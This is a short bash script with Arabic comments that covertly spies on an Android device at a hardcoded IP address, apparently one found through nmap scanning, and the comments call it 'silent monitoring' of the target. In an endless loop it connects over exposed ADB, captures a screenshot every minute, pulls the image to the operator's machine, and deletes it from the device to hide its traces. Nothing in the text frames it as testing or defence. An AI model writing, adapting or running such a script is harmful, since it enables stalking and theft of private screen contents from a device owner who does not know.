#!/bin/bash

# إعدادات الهدف
IP="192.168.1.14"
PORT="5555" # تأكد من تغيير البورت إذا اكتشفت بورت آخر عبر nmap
DELAY=60    # الوقت بالثواني بين كل صورة (دقيقة واحدة)

echo "جاري بدء المراقبة الصامتة على $IP..."

# حلقة تكرارية لا تنتهي
while true
do
    # 1. محاولة الاتصال
    adb connect $IP:$PORT > /dev/null 2>&1
    
    # 2. أخذ لقطة شاشة وتسميتها بالوقت الحالي
    TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    FILENAME="snap_$TIMESTAMP.png"
    
    # تنفيذ الأمر وسحب الصورة ثم قطع الاتصال فوراً
    adb shell screencap -p /sdcard/s.png && \
    adb pull /sdcard/s.png ./$FILENAME && \
    adb shell rm /sdcard/s.png && \
    adb disconnect > /dev/null 2>&1
    
    echo "تم التقاط صورة وحفظها باسم: $FILENAME"
    
    # الانتظار قبل اللقطة القادمة
    sleep $DELAY
done

